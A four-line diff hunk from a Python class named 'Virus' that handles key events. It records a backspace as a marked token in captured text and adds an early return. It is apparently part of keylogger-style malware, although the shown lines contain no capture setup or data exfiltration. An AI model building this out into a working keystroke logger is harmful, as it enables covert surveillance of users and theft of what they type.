@@ -108,3 +108,4 @@ class Virus(object):
                     return
                 elif key.name == "backspace":
                     self.append_text("\x00<^backspace>\x00")
+                    return
